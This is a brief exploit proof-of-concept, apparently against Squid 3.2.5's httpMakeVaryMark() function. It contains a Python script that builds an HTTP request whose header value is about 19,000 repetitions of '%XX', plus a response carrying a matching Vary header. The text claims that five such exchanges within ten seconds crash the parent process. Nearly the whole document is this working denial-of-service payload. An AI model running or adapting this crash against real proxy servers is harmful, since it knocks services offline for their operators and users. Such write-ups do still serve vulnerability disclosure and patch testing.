##############################################################
# httpMakeVaryMark() header value 'value' (http.cc:603 line) #
##############################################################
#
# Authors:
#
# 22733db72ab3ed94b5f8a1ffcde850251fe6f466
# c8e74ebd8392fda4788179f9a02bb49337638e7b
# AKAT-1
#
#######################################

# Versions: 3.2.5

  It takes combination of a 5x requests and responses in less than 10 seconds to crash the parent:
  Request
  -- cut --
  #!/usr/bin/env python
  print 'GET /index.html HTTP/1.1'
  print 'Host: localhost'
  print 'X-HEADSHOT: ' + '%XX' * 19000
  print '\r\n\r\n'
  -- cut --

  Response
  -- cut --
  HTTP/1.1 200 OK
  Vary: X-HEADSHOT
  -- cut --
